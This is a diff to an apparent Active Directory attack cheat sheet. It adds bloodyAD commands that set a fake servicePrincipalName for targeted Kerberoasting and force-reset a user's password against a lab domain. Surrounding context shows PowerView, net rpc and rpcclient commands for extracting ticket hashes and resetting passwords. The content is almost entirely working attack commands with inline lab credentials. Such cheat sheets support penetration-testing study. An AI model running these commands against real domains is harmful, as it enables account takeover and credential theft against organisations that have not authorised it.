@@ -1389,6 +1389,10 @@ Set-DomainObject -Identity target_user -Set @{serviceprincipalname='nonexistent/
 Get-DomainUser target_user -SPN | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
 Set-DomainObject -Identity target_user -Clear serviceprincipalname -Verbose
 ```
+```bash
+# bloodyAD
+bloodyAD --host 172.16.1.15 -d inlanefreight.local -u david -p 'Password123!' set object websecUser servicePrincipalName -v fake/web01.inlanefreight.local 
+```
 Reset Password
 GenericAll, AllExtendedRights, User-Force-Change-Password
 ```powershell
@@ -1397,13 +1401,16 @@ Set-ADAccountPassword target_user -NewPassword $((ConvertTo-SecureString 'Passwo
 # PowerView
 Set-DomainUserPassword -Identity target_user -AccountPassword $((ConvertTo-SecureString 'Password123!' -AsPlainText -Force)) -Verbose
 ```
-```linux
+```bash
 # net rpc
 net rpc password target_user 'Password123!' -U inlanefreight.local/own_user%'Password1' -S 10.129.205.81
 
 # rpcclient
 rpcclient -U INLANEFREIGHT/own_user%Password1 10.129.205.81
 setuserinfo2 target_user 23 Password123!
+
+# bloodyAD
+bloodyAD --host 172.16.1.15 -d inlanefreight.local  -u svc_sql -p 'XXX' set password david 'Password123!'
 ```
 WriteDACL
 ```bash
